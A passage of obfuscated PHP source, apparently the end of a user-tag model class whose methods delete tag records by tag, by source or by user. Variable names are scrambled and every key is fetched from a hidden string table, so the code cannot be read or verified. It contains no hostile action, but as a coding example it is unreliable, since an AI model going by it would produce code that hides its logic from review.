$ë„€¯[425], $ë„€¯[429] => $§ºº¥Õ ? $§ºº¥Õ : $ë„€¯[12], $ë„€¯[1831] => 0); if ($this->where($‚³À“éâ)->find()) { return !1; } return $this->add($‚³À“éâ); } protected function removeFromTag($‘¨ÊÒıñ, $çóõäÇ) { $•ä°´åÂ =& $_SERVER[„Ç©ñÎ©]; if (!Model($•ä°´åÂ[2082])->listData($çóõäÇ)) { return !1; } if (is_array($‘¨ÊÒıñ)) { $‘¨ÊÒıñ = array($•ä°´åÂ[7], $‘¨ÊÒıñ); } $©·ÎŸ†ú = array($•ä°´åÂ[1646] => USER_ID, $•ä°´åÂ[493] => $çóõäÇ, $•ä°´åÂ[430] => $‘¨ÊÒıñ); return $this->where($©·ÎŸ†ú)->delete(); } protected function removeByTag($‚àî˜Ó) { $ëßÓæ =& $_SERVER[„Ç©ñÎ©]; if (!$‚àî˜Ó) { return !1; } $÷œ„³Ğ÷ = array($ëßÓæ[1646] => USER_ID, $ëßÓæ[493] => $‚àî˜Ó); return $this->where($÷œ„³Ğ÷)->delete(); } protected function removeBySource($ıâªÚ©¿) { $Åğ½¨ôŸ =& $_SERVER[„Ç©ñÎ©]; if (is_array($ıâªÚ©¿)) { $ıâªÚ©¿ = array($Åğ½¨ôŸ[7], $ıâªÚ©¿); } $à©¨ªş = array($Åğ½¨ôŸ[1646] => USER_ID, $Åğ½¨ôŸ[493] => array($Åğ½¨ôŸ[1013], 0), $Åğ½¨ôŸ[430] => $ıâªÚ©¿); return $this->where($à©¨ªş)->delete(); } }